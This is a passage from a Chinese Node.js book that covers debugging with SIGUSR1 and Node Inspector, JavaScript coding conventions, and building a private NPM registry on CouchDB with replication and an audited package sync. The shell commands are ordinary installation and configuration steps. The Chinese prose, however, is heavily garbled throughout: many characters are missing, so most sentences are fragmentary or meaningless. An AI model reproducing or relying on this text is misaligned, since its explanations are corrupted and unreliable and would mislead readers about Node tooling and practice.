这要一下，Node 的试客端并没有 V8 的有，只有的的。
中要有下几个。
. contc。继续。
. nextn。到下一个。
. steps。到数内部。. outo。从数内部。
. pause。。过入后，可以过试。过，还可以继续。V8 了下几的。
. setBreakpoint()sb()。在前
. setBreakpoint(line)sb(line)。在定的。
. setBreakpoint('fn()')sb(...)。在数的一个。. setBreakpoint('script.js', 1)sb(...)。在脚本的 1。
. clearBreakpointcb(...)。。了外，在中后试时，还可以一些信。这些信下。
. backtracebt。前情下的信。. list(5)。前上下前后 5 的源。. watch(expr)。加到，。. unwatch(expr)。从中对的。. watchers。有的。
. repl。开试的，用于试脚本的上下。V8 的试能了在中过 debug 可以用外，对于已经的程，可以过

发 SIGUSR1 信用试。过下动了一个服务程$ node server.js  过ps程的ID，后对这个中的程发SIGUSR1信，下$ kill -s USR1 10093
在有的程下，可以到接收到信并动试客端的信，下
\$ node server.js Hit SIGUSR1 -starting debugger agent. debugger listening on port 5858
试客端动后，可以过问http://localhost:5858/试。这入我们下一个试工的Node Inspector 工就是在这个上实的图试。

## B.2 Node Inspector

Node Inspector 工是于 DebuggerBlink 开发者工创的试。在的试能
，源自 Node 为 V8 内的试，能自 Blink 的开发者工。有 Blink 开发者工的有 Chrome、Opera。这着我们可以像试中的 JavaScript 一样试 Node 中的 JavaScript。
B.2.1Node Inspector
在使用 Node Inspector 之前，要过 NPM 工它为工，下
$ npm install -g node-inspector 
B.2.2
使用NodeInspector用Node程的试。用试的在前有过，在中使用debug者过发SIGUSR1Node程可用试。
动Node程试后，就可以动Node Inspector工。Node Inspector工相于在Blink开发者工与Node程的试之立了系。动下
$ node-inspector
Node Inspector v0.5.0
info -socket.io started
Visit http://127.0.0.1:8080/debug?port=5858 to start debugging.
中了一些信，这时可以开 Blink 开发者工的问http://127.0.0.1: 8080/debug?port=5858 开始的试。开后会图 B-1 这样的。

图 B-1 开后的试
在 Sources 中可以的 JavaScript 脚本，后续的试过程就在中试 JavaScript 一样。

## B.3 总结

由于 Node 要在服务中，试会起中，中服务，不于在有大问量的情下。试只于开发，并且由于过程，不在开发中过于。好的是编写好的测试做的，这对于程序开发量，信也高。
Node
G

# 附录 C Node 编码规范

## C.1 根源

JavaScript 作为一门编程语言，在语上可是最为灵活的语言了。有人喜欢它的灵活，也有人它的。它的灵活也好，也，都不开生的。Brendan Eich 在 1995 年了 10 天了这门语言，后在 1996 年也发了 JavaScript 的 IE3.0。网景为了自己，在 1996 年 11 月 JavaScriptECMA 组织，次年 6 月一发，为 ECMAScript，编 262。
年的 JavaScript 编写分。它的灵活性都高，使开发者可以编，最它在一定程上。在编上，一个要的人是 DouglasCrockford，他是 JavaScript 开发社区最的，是 JSON、JSLint、JSMinADSafe 之，中 JSLint 在是最要的 JavaScript 质量测工。他的 JavaScript: TheGoodParts 一书对于 JavaScript 社区深。
，一门语言的发要经多年的才能为大接。由于因，JavaScript 在的时内就定，这样它的优都在大之下。Douglas Crockford 的 JSLintJavaScriptTheGoodParts 对 JavaScript 的贡献在于，他我们能语言中的，写好的。
与他语言（PythonRuby）的程序相，JavaScript 程序要多的自才能写读、的。为这个问题，部分开发者 TypeScriptCoffeeScript 编写应用。我认为了解一门语言为是下这情是有要的。编的目的是在一定程上程序，使之能在中并且。
管 JavaScript 已经相熟，用 JSLint 能解决大部分问题，是着 Node 的，了一些新的，这些要起我们。本是在了 JavaScript 的编的上，Node 的环境社区的习。

## C.2 编码规范

C.2.1

1.

用 2 个，不是 tab。在编中与是的，tab 可能因编的不。2 个会起、。

2.

用 var 量，不加 var 时会量，这样可能会外上下，是
外。在 ECMAScript 5 的 strict 下，的量会接 ReferenceError。
要的是，都应上 var，不是只有一个 var，下
var assert = require('assert'); var fork = require('child_process').fork; var net = require('net'); var EventEmitter = require('events').EventEmitter;
下
var assert = require('assert')
, fork = require('child_process').fork
, net = require('net')
, EventEmitter = require('events').EventEmitter;

3.

在作前后要加，+、-、\*、%、=作前后都应在一个，下
var foo = 'bar' + baz;
的下
var foo='bar'+baz;
外，在小括前后应在，
if (true) {
// some code
}
的下
if(true){
// some code
}

4.

由于在的场景下使用多，在 Node 中使用时量使用，这样，
var html = '<a href="http://cnodejs.org">CNode</a>';
在 JSON 中，的是要用，内中时，要。

5.

一情下，大括起一，
if (true) { // some code }
的下
if (true) { // some code }

6.

用于量的分是的分。不在，前要一个。外，
不在，var foo = 'hello', bar = 'world'; // 是 var hello = { foo:
'hello', bar: 'world' }; //是 var world = ['hello', 'world'];下
var foo = 'hello'
, bar = 'world'; //是 var hello = {foo: 'hello'
, bar: 'world' }; //是 var world = [
'hello' , 'world' ];

7.

加分。管 JavaScript 编会自动加分，还是会一些解，下
function add() { var a = 1, b = 2 return
a+ b }
会到 undefined 的。因为自动加入分后会下的样
function add() { var a = 1, b = 2; return;
a + b; }
后续的 a + b 不会。
下的
x = y (function () { }())
时会到
x = y(function () {}())
由于自动加分可能的，以加上分有于会。
C.2.2
在编过程中，是。好的可以心目，的阅读享，有好的可性。的要有量、量、、、、包。

1.

量都用小，了一个的不大写外，个的都大写，与之没有，
var adminUser = {};
的下
var admin_user = {};

2.

与量一样，用小。与量不的是，量用动，
var getUser = function () {}; var isAdmin = function () {}; User.prototype.getInfo = function () {};
下
var get_user = function () {}; var is_admin = function () {}; User.prototype.get_info = function () {};

3.

用大，有的都大写，
function User { }

4.

作为量时，的有都大写，并用下线分，
var PINK_COLOR = "pink";

5.

时，请量用下线分，child_process.jsstring_decode.js。你不
想他用，可以定以下线开，\_linklist.js。

6.

也你有贡献并包发到 NPM 上。在包中，量不要包 jsnode 的样，它是复的。包应且有的，
var express = require('express');
C.2.3
在作中，是的场景，请量使用=====，否你会到下这样不
的
'0' == 0; // true '' == 0 // true '0' === '' // false
外，时，可以使用=====。在下的中，foo 是 0、undefined、
null、false、''时，都会入分
if (!foo) { // some code }
C.2.4
请量使用{}、[]new Object()、new Array()，不要使用 string、bool、number 对，不要用 new String、new Booleannew Number。
C.2.5
在 JavaScript 中，要一个关一个，它们是 witheval()，起作用。

1. with
   下
   with (obj) { foo = bar; }
   它的有可能是下之一 obj.foo = obj.bar;、obj.foo = bar;、foo = bar;、foo = obj.bar;，这些决于它的作用。作用上没有的量在，使用它是的。在多人作的目中，这并不，以要用 with。
2. eval()
   用 eval()的因与 with 相。不作用上已在的量，用它是的。外，用 eval()的这个性，也可以一些好的性，wind.js 用它实了程，4。在大多数情下，本上不到 eval()使。下
   var obj = { foo: 'hello', bar: 'world'
   }; var key = (Math.round(Math.random() \* 100) % 2 === 0) ? 'foo' : 'bar'; var value = eval('(obj.' + key + ')');
   上多在新中，实只要下一可
   var value = obj[key];
   C.2.6
   在 JavaScript 中，数组实也是对，是者在使用时有些要。
3.

创对者数组时，在用分。分，一只能一个，下
var foo = ['hello', 'world'];
var bar = { hello: 'world', pretty: 'code'
};
下
var foo = ['hello', 'world']; var bar = {
hello: 'world', pretty: 'code' };

2. for in
   使用 for in 环时，请对对使用，不要对数组使用，下
   var foo = []; foo[100] = 100; for (var i in foo) {
   console.log(i); } for (var i = 0; i < foo.length; i++) {
   console.log(i); }
   在上中，一个环只一次，个环 0~100，这并不。
3.

管在 JavaScript 内部实中可以数组做对使用，下
var foo = [1, 2, 3]; foo['hello'] = 'world';
这在 for in 时，会到有
for (var i in foo) { console.log(foo[i]); }
也你只是想到 hello 已。
C.2.7
在 Node 中，使用广并且在实践过程中了一些定，这是以不在的。

1. 一
   部分内在 4 中有。并不是有数都要一个数为对。是一，会 try catch 到的。一个数为对，用是一个不的定。下
   function (err, data) { };
   这个定很多程用。这个定，可以享社区程的务编写。
2.

在中一有数入，就一定要它，且不能多次。不，可能用一不，多次也可能会的。
C.2.8
关于在 JavaScript 中实继，有样的，在 Node 中我们只推荐一，就是继的。外，在 Node 中，要一个作为一个，就要在它的。

1.

一情下，我们用 Node 推荐的继，下
function Socket(options) { // ... stream.Stream.call(this); // ...
}
util.inherits(Socket, stream.Stream);

2.

有外部用的量在 exports 量上。要做一个时，要过下的
module.exprots = Class;
不是过
exports = Class;
有因为测试因外部，以。
C.2.9
一情下，我们会对个编写，这用 dox 的推荐，下
/\*\*

-

Queries some records

-

Examples:

-

```

*
query('SELECT * FROM table', function (err, data) {

*
// some code

 *
});

*
```

-

@param {String} sql Queries

-

@param {Function} callback Callback \*/ exports.query = function (sql, callback) {

// ... };
dox 的源自于 JSDoc。可以过生对应的 API。

## C.3 最佳实践

的编有很多，有的也，这并不我们到。
C.3.1
你要贡献部分个开源目，它的编与你并不相，这情下要用入的，量开源目本的编不是自己的编。
C.3.2
实上，在的编本上都可以过的 JSLint 者 JSHint 这样的质量工开发环境中，这样编后就可以时到。用的是 Sublime Text 2 编，在好后，可以在目中.jshintrc，次都会在编中不的信。下是我个目的.jshintrc，仅
{
"predef": [ "document", "module", "require", "__dirname", "process", "console", "it", "xit",
"describe", "xdescribe", "before", "beforeEach", "after", "afterEach"
], "node": true, "es5": true, "bitwise": true, "curly": true, "eqeqeq": true, "forin": false, "immed": true, "latedef": true, "newcap": false, "noarg": true, "noempty": true, "nonew": true, "plusplus": false, "undef": true, "strict": false, "trailing": false, "globalstrict": true, "nonstandard": true, "white": true, "indent": 2, "expr": true, "multistr": true, "onevar": false, "unused": "vars", "swindent": false
}
C.3.3hook
一最实践是在本工中的。SVN 还是 Git，都有 precommit 这样的脚本，过在时实质量的。质量不，。
C.3.4
续包个一是质量的可以定时，是触发
一可以过中的统质量的好势，。统可以定中的个
人对编的情，决定用的质量管还是的。

## C.4 总结

质量关产品的质量，最的是编，收也是最高的，它
测试要实践。一定了编，就应，绝中编后的。
也可以用 CoffeeScript 的编的问题，是我相信在使用 CoffeeScript 之前，了解这些会好你解 CoffeeScript。
你还用编 JavaScript 编写你的应用，请这些编。管因为因一到这些，是为优，为，就应优做一习。

## C.5 参考资源

本章参考的资源如下：

- http://google-styleguide.googlecode.com/svn/trunk/javascriptguide.xml
- http://caolanmcmahon.com/posts/nodejs_style_and_structure/
- http://nodeguide.com/style.htmlFelix’sNode.js
- https://npmjs.org/doc/coding-style.htmlNPM

# 附录 D 搭建局域 NPM 仓库

2 到了 NPM，它由今 Node 的门人 Isaac Z. Schlueter 创。最初，NPM 与 Node 自发，在 Node v0.6.3 时，它为 Node 的一部分。NPM 的了 Node 的个生，
为用，管为很的事情，个生性发。今，在 GitHub 上托管源，在 NPM 上发，在中使用包，这者 Node 应用的环。这在开源社区中是极的。

是在开源社区中极的应用并不一定一些内部。目前，在 NPM 上还在一些问题，要在下几个。
质量不。
有、享、新的问题。本在。。对于应用言，它们定质量。社区中数量多，不很多优的，

是大部分的质量不，在使用时要量性。
对于言，自编写的于量，发到的 NPM 上，这对有的享、新都应用上的。
NPM 过加--force 强发，管它会发，是对于不在自己中的，性发可能的。可能在次之本相，是内实已经不了，这的是相不可的。
外，NPM 是托管在 Iris Couch 的上，服务并没有对中国的网环境过优，经一到一些网环境的，定性。
上这些因都使应有自己的 NPM。为，Node v0.10.0 发时，Isaac Z. Schlueter 到 Iris Couch 于 NPM 的经，他们为推了 irisnpm 服务有 NPM。过在 irisnpm 上可以请服务。了使用 irisnpm 的服务外，我们还可以自 NPM。自 NPM，可以实内部与社区之的，一可以绝上问题的发生，一可以享 NPM 工生的性性。
在 package.json 中编写，过 NPM 工从有中，自动的，这与使用开源社区的一样。没有有 NPM，享的过程甚至会
为复的工活，本高。

## D.1 NPM 仓库的安装

NPM 的源托管在 GitHub 上，是http://github.com/isaacs/npmjs.org。相对于中的NPM，NPM是的服务。
NPM 的于 CouchDB 实。CouchDB 是一 NoSQL 数，于，它的
有本性质，时的 HTTPRESTful 接分好用，这与 Node 的有为相的性。Isaac Z. Schlueter 是在这个上用它实的托管。有的是，作为与 Node 在网并发的 Erlang 语言，者的关系，实在是有的。因为 CouchDB 于 Erlang 写，NPM 用它托管。
NPM 要由部分组，在源中分是 wwwregistry。www 是 NPM 的，registry 是用 CouchDB 包 JSON API，NPMNPM 工服务。图 D-1 了 NPM 的。

图 D-1 NPM
由于在 CouchDB 中 Web 应用为复杂，后 Isaac Z. Schlueter 新了一个新的 NPM 的 Web 应用，用 CouchDB 的 Web 应用服务，CouchDB 做的数托管并 HTTP RESTful 服务。这个新的 NPM Web 应用就是图 D-1 中的 new www 应用，源在https://github. com/isaacs/npm-www 中。
D.1.1ErlangCouchDB
NPM 的环境复杂，对于 Windows 言，可以到编好的 ErlangCouchDB 本。对于 LinuxMac 用，这要一下。

1. Erlang
   Erlang 的下
   $ wget http://www.erlang.org/download/otp_src_R15B01.tar.gz $ tar zxvf otp_src_R15B01.tar.gz $ cd otp_src_R15B01 $ ./configure $ make & sudo make install 
次入下的，是否
$ erl Erlang R15B01 (erts-5.9.1) [source][smp:4:4] [async-threads:0][hipe] [kernel-poll:false]
   Eshell V5.9.1 (abort with ^G) 1>
2. CouchDB
   在有 Erlang 环境的情下，CouchDB 才能。Erlang 不大，相关下
   $ wget http://mirror.bit.edu.cn/apache/couchdb/releases/1.2.0/apache-couchdb-1.2.0.tar.gz $ tar zxvf apache-couchdb-1.2.0.tar.gz $ cd apache-couchdb-1.2.0 $ ./configure --prefix=/home/admin/couchdb #空间的的目录$ make & sudo make install 
上要的是中在大量，会用多的，以要的目。在./configure时者后。CouchDB的还要Mozilla的SpiderMonkey一些JavaScript，它的下
$ wget http://ftp.mozilla.org/pub/mozilla.org/js/js185-1.0.0.tar.gz $ tar zxvf js185-1.0.0.tar.gz $ cd js-1.8.5/js $ autoconf-2.13 $ ./configure \$ make & make install
3. CouchDB
   动 CouchDB 服务的下
   $ sudo couchdb & $ curl -i http://127.0.0.1:5984/ #查看服务是否启动正确
   D.1.2NPM
   在前工作就之后，我们就可以 NPM 了，这一要 CouchDB 一动作为服务。NPM 要包下 5。
   (1)创 NPM 数。，我们要用 CouchDB 的接为创一个数，之后有的包作为在这个数中。
   $ curl -X PUT http://127.0.0.1:5984/registry
{"ok":true} 
之外，还要NPM服务的源。(2) NPM源。相关下
$ git clone https://github.com/isaacs/npmjs.org.git $ cd npmjs.org 
(3) 工。相关下
$ sudo npm install couchapp -g $ npm install couchapp $ npm install semver
   (4) NPM 到 CouchDB 中。相关下
   $ couchapp push registry/app.js http://127.0.0.1:5984/registry Preparing. Serializing. PUT http://127.0.0.1:5984/registry/_design/scratch Finished push. 1-4dd18325b8d8c5e60d1451904005414e $ couchapp push www/app.js http://127.0.0.1:5984/registry Preparing. Serializing. PUT http://127.0.0.1:5984/registry/_design/ui Finished push. 1-4357980d099a397591f54fc7bf1c469b
   上分 registrywww 下的 CouchDB 的 registry 中。一个本的 NPM
   就了。问http://127.0.0.1:5984/registry/_design/ui/_rewrite，可以到NPM的WebUI。问http://127.0.0.1:5984/registry/_design/scratch/_rewrite，对应的是JSON API 服务。这个 URL 相对言。可以在 CouchDB 前反，使 URL 优
   ，http://search.npm.your_domain.com/http://registry.npm.your_domain.com/，这样可以端，有一个的可。之外，CouchDB的，也可以到这个。
   . CouchDB 监 127.0.0.1 有 CouchDB0.0.0.0 部。

- http://127.0.0.1:5984/registry/_design/scratch/_rewriteinsecure_rewrite_ rule too many ../.. segments 样的错误 CouchDB 中的 secure_rewrites false。
  (5) NPM 客端。要从本 NPM 作的，只要加入--registry=http:
  //127.0.0.1:5984/registry/\_design/scratch/\_rewrite 可。$ npm install plusplus --registry=http://127.0.0.1:5984/registry/_design/scratch/_rewrite
为了解决过不的问题，可以使用下
$ npm config set registry http://127.0.0.1:5984/registry/_design/scratch/_rewrite
  这个的一个问题在于，经要在本，就。为，我们可以用 bash 中的 alias 能解决这个问题。在~/.bashrc~/.profile 的加下这
  alias lnpm='npm --registry=http://127.0.0.1:5984/registry/_design/scratch/_rewrite'新动，npm作的是，lnpm作的是本。余数相。

## D.2 高阶应用

在上过程中，我们了一个 NPM 的。我们可以这个本用作像，也可以用作自己新的。
D.2.1
像，是的一个像，我们可以过的中的包到像中。像可以解决过程中的问题，定性可以到。是一个新的问题是要，否中会后于的情。
由于 NPM 实质上就是一个 CouchDB 数，到像实就是对数的复。这个复过程可以用 CouchDB 自己的复能，它的实质是量的能。我试过很多次，由于网问题，的复性能分。Node 社区的 MikealRogers（request 的作者、NodeConf 大会组织者）写了一个 replicate 用工作。的下
$ [sudo] npm install -g replicate 
下的可以实从目CouchDB到一个CouchDB中。对于言，它的是http://isaacs.iriscouch.com/registry/。它的是用CouchDB的/_changes接，源的动，目的/_missing_revs接，到目些（也就是包），后个的。
$ replicate http://admin:pass@somecouch/sourcedb http://admin:pass@somecouch/destinationdb
想续性到像中，可以过 crontab 定时务实。
上的问题是网问题，可能会中，且至目前有 3 多个，新次数 55 次，是一个不小的工程。
D.2.2
实像后，这个像用于生产，它能解决前到的 4 个问题中的有
网定性这个问题。我们可以过 NPM 工 registry 的使用像，甚至发自己的有到有中，解决心的问题，还不能解决的问题是质量本中在的。
我经试过，一是上的有到自有中，后有的使用，它的使用图 D-2。

图 D-2 在像中使用有
在这个中，我们过一个像，有发到像中。对于务不相关的，我们可以发到有 NPM 中，到开源社区。我们相信绝大多数也是过这 Node 开发的。在这个中，我们可以到 NPM 上为能有多的高质量。在享开源的过程中也不开源社区。相作，产的的质量可能高，因为这个多数已经自己使用实践过。
D.2.3
像加有的已经能最心的定性性问题以解决，是本发可的质量的问题还不能到解决，我们一有都入到我们的生产环境中，对于我们解决质量问题没有。相反，的没有到。者，NPM 上多的，能用到的不分之一。外，由于是在内部使用这些，并不要对开。因，我们可以试应用上的，解决心的有问题。
由于我们并不要有的，以我们试在图 D-2 中的量这。在这个环中，我们加入机，从量为，图 D-3。

图 D-3 量为
在这个过程中，也要对工。只要定的可，对于的，我们可以以是否的。

1.

为了的，我在 replicate 工的上了，编写了 sync_package。它的使用下
$ npm install sync_package -g $ npm config set remote_registry http://isaacs.iriscouch.com/registry/ $ #为本仓库的写入限问题写上$ npm config set local_registry http://username:password@ip/registry/ $ sync_package express #同步express模块
这个工只定的，replicate，能的。认情下，这会时的有。加-D可以
$ sync_package express -D
sync_package 的是对源中的信目中的信，不，源中的到目中。实这个过程的接是/module_name?revs_info=true，它的信用于对。中源目的在前的中，过 NPM 工可以。

2.

实了后，还要对这个过程加入机。的目的在于认是否应，这个在质量性上是否到认可。这个过程就是对的过程，过，可以很好绝质量的入我们的生产环境。
要机，关在于的。我们有的写入，过一个 Web 系统管，了管外，余开发人没有要。也就是，我们的能作为一个触发性能，后自动。图 D-4 了的程图。

图 D-4 的程图
包的过程对于请的人于环境，过可，过程要的只在开始时由管好可。

3.

过机可以很好包的问题。接下，要的是自己的有。在环境中，应于个个人，因为个人可能在、为，不能像社区样自过 npm adduser 的发。为，可以在 Web 系统中实这个管，统一为一个，由管 npm adduser 的作。样，发的过程也不是过开发者的，是由 Web 系统过 npm publish 作的。
对于，大多数开发都有自己的程。在有本要发的时候，过 Web 系统请发可。在发的过程中，可以过源本系统与，这个过程图 D-5。

图 D-5 的发程
在中，--force 的发，过这个 Web 系统这个作，发以在。

4.

过对有加入机、产品作后，上在者的（数）已经有过一年的经。了多个数个产品的开发线上部。上的 Web 系统是我们的管系统，由于开发过程中与有一些，之后会这部分，后开源到社区中。

## D.3 总结

NPM 在 Node 的发程中有着不可没的作用。没有 NPM，Node 就没有多的可
以使用。没有 NPM，CommonJS 组织 JavaScript 应用到的想不可能这实。NPM 对应用的，很多在应用 Node 的过程中要经很多。本的解决在应用 Node 时能在的时享到开源社区的好，NPM 工不应因为环境的不不能使用。

## D.4 参考资源

- https://www.irisnpm.com/
- http://www.erlang.org/doc/installation_guide/INSTALL.html
- http://wiki.apache.org/couchdb/Installation
- https://github.com/isaacs/npmjs.org
- https://github.com/isaacs/npm-www
- https://developer.mozilla.org/en-US/docs/SpiderMonkey/Build_Documentation
- https://github.com/mikeal/replicate
- https://github.com/TBEDP/sync_package
